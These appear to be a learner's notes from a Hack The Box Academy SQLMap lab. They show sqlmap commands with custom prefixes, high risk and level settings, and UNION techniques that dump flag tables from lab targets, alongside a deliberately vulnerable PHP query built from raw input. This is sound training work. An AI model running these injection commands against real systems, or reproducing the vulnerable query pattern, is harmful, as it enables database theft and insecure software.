
https://academy.hackthebox.com/module/58/section/526

SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:

- vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
    
- boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

## Prefix/Suffix
```bash
sqlmap -u http://83.136.254.73:47639/case5.php?id=1" --prefix="%'))" --suffix="-- -"
```


```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```



## Level/Risk
possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
    
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

```shell-session
AhmaDb0x@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
```


###### You can use the option '-T flag5' to only dump data from the needed table. You can use the '--no-cast' flag to ensure you get the correct content. You may also, try running the command a few times to ensure you captured the content correctly.

```bash
sqlmap -u "http://83.136.254.73:47639/case5.php?id=1" --batch --risk=3 --level=5 -T flag6 --dump --no-cast

```

flag6
'`)'

Let's assume the website expects queries like:
```bash
SELECT * FROM users WHERE id = (1);

```

```bash
sqlmap -u "http://83.136.254.73:47639/case6.php?col=id" --prefix="%'))"
```

```bash
SELECT * FROM users WHERE id = (%'))1 OR 1=1);

```

```
 sqlmap -u "http://83.136.254.73:47639/case6.php?col=id" --prefix="`)" --batch --risk=3 --level=5 -T flag6 --dump 
 ```

```bash
sqlmap -u "http://83.136.254.73:47639/case6.php?col=id" --prefix="\`)" --batch --risk=3 --level=5 -T flag6 --dump

```

```bash
sqlmap -u "http://83.136.254.73:47639/case6.php?col=id" --prefix='`)' --batch --risk=3 --level=5 -T flag6 --dump

```

```bash
sqlmap -u "http://83.136.254.73:47639/case7.php?id=1" --technique=U --union-cols=5  --dump --batch -T flag7 --dump


```

```bash
sqlmap -u "http://83.136.254.73:47639/case7.php?id=1" --technique=U --union-cols=5 --batch --dbs

```

https://academy.hackthebox.com/module/58/section/526